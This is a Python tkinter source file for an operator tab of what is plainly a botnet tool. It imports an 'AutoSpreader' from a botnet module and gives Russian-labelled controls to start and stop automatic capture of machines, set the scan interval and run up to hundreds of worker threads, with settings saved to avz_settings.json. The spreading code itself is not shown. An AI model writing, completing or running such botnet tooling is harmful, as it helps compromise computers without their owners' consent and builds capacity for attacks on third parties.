import tkinter as tk
from tkinter import ttk, messagebox
import json, os, threading
from utils.logger import log
from botnet.auto_spreader import AutoSpreader

class BotAutoTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.spreader = AutoSpreader()
        self.build_ui()

    def build_ui(self):
        ttk.Label(self, text="Статус:").grid(row=0, column=0, padx=5, sticky=tk.W)
        self.auto_status_label = ttk.Label(self, text="Неактивен")
        self.auto_status_label.grid(row=0, column=1, sticky=tk.W)
        self.toggle_btn = ttk.Button(self, text="Запустить", command=self.toggle_spreader)
        self.toggle_btn.grid(row=1, column=0, padx=5, pady=5)
        ttk.Button(self, text="Применить настройки", command=self.reload_spreader).grid(row=1, column=1, padx=5)
        ttk.Label(self, text="Интервал (сек):").grid(row=2, column=0, padx=5, sticky=tk.W)
        self.interval_var = tk.StringVar(value="30")
        ttk.Entry(self, textvariable=self.interval_var, width=10).grid(row=2, column=1, padx=5, sticky=tk.W)
        ttk.Label(self, text="Потоков:").grid(row=3, column=0, padx=5, sticky=tk.W)
        self.auto_threads_var = tk.StringVar(value="500")
        ttk.Entry(self, textvariable=self.auto_threads_var, width=10).grid(row=3, column=1, padx=5, sticky=tk.W)
        self.load_auto_settings()

    def load_auto_settings(self):
        try:
            with open("avz_settings.json") as f:
                s = json.load(f)
            self.interval_var.set(str(int(s.get("auto_spread_interval_min", 30)*60)))
            self.auto_threads_var.set(str(s.get("spread_worker_threads", 200)))
            if s.get("auto_spread_enabled"):
                self.auto_status_label.config(text="Активен")
                self.toggle_btn.config(text="Остановить")
        except: pass

    def toggle_spreader(self):
        if self.spreader.running:
            self.spreader.stop()
            self.auto_status_label.config(text="Неактивен")
            self.toggle_btn.config(text="Запустить")
        else:
            self.save_auto_settings()
            self.spreader.load_settings("avz_settings.json")
            self.spreader.start()
            self.auto_status_label.config(text="Активен")
            self.toggle_btn.config(text="Остановить")

    def save_auto_settings(self):
        try:
            with open("avz_settings.json","r") as f:
                s = json.load(f)
        except:
            s = {}
        s["auto_spread_interval_min"] = int(self.interval_var.get()) / 60
        s["spread_worker_threads"] = int(self.auto_threads_var.get())
        s["auto_spread_enabled"] = True
        with open("avz_settings.json","w") as f:
            json.dump(s, f, indent=2)
        messagebox.showinfo("Настройки", "Сохранено")

    def reload_spreader(self):
        self.save_auto_settings()
        self.spreader.load_settings("avz_settings.json")
        log("[Автозахват] Настройки обновлены")
